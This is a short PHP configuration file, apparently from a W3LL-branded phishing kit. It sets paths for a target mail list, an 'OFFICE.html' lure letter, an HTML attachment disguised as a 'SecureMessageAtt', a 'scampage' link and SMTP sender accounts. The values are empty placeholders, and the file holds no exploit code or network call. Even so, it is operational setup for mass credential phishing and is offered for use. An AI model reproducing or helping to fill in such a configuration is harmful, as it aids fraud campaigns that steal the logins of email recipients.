<?php

/* W3LL MAIL_LIST SETUP */

$mail_list = "file/W3LL_MAILLIST/W3LL_MAIL.txt"; //Your mail list file name | don't change file/W3LL_LETTER/

/* W3LL MAIL_LIST SETUP */

/* W3LL LETTER SETUP */

$msg_file = "file/W3LL_LETTER/OFFICE.html"; //Your letter file name | don't change file/W3LL_LETTER/

/* W3LL LETTER SETUP */

/* W3LL ATTACHMENT SETUP */

$attachment = "SecureMessageAtt.html"; //Name of your attachment

/* W3LL ATTACHMENT SETUP */

$scampage = [


		"", // Your scampage link

];

/* W3LL SMTP SETUP */

$smtp_acc = [


/* example 

//dont change bellow!!


*/

];


/* W3LL SMTP SETUP */

?>